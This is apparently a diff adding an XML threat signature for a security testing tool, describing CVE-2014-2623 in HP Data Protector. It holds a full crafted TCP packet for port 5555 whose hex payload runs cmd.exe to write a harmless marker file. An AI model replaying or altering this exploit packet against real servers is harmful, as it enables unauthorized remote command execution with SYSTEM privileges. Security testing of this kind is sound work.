@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="HP Data Protector Opcode 28 and 11 Command Execution"/>
+    <EngDesc display="true" value="An command execution vulnerability exists in Hewlett-Packard Data Protector. The vulnerability is due to the a design weakness when handling requests to port 5555. A remote attacker can exploit this vulnerability by sending crafted packets to the target service. Successful exploitation could lead to arbitrary command execution with System privileges on the target server. Tester should turn variable $destPort into 5555 before test."/>
+    <Intent display="true">
+      <item value="DESIGN_WEAKNESS"/>
+    </Intent>
+    <Protocol display="true" value="HP Data Protector OmniInet Protocol( up TCP port 5555)"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="Critical"/>
+    <Known_Vendors_Affected display="true">
+      <item value="HP"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Data_Protector"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="8.x"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20140718-03"/>
+    <CVEID display="true" value="CVE-2014-2623"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="109069"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="1c690315ac24837df57bd6335c736508"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="LOW"/>
+    <Authentication display="false" value="NONE"/>
+    <ConfImpact display="false" value="COMPLETE"/>
+    <IntegImpact display="false" value="COMPLETE"/>
+    <AvailImpact display="false" value="COMPLETE"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635447439263685681"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1415961043" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:50:56:B4:7D:FA" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="017C" Identification="C215" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="15D0" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="54154" destPort="$destPort" SeqNumber="1961AD6B" AckNumber="899268CF" HeaderLength="08" WindowSize="002E" Checksum="1544" UrgentPointer="0000" Options="0101080A2DCB6F7B028F59B8" Payload="00000144FFFE32000000200041004100410000002000410041004100000020004100410041000000200041004100410000002000410041004100000020003100310000002000410041004100000020004100410041000000200041004100410000002000410041004100000020004100410041000000200041004100410000002000410041004100000020004100410041000000200041004100410000002000410041004100000020004100410041000000200063003A005C00770069006E0064006F00770073005C00730079007300740065006D00330032005C0063006D0064002E0065007800650000002000410041004100000020002F00630020006500630068006F002000540045004C005500530020005300650063007500720069007400790020004C006100620073003E00200063003A005C00540053004C002E007400780074000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:7D:FA" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0040" Identification="36A0" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="6281" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$destPort" destPort="54154" SeqNumber="899268CF" AckNumber="1961AEB3" HeaderLength="08" WindowSize="0104" Checksum="40C1" UrgentPointer="0000" Options="0101080A028F59BC2DCB6F7B" Payload="00000008FFFE360000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
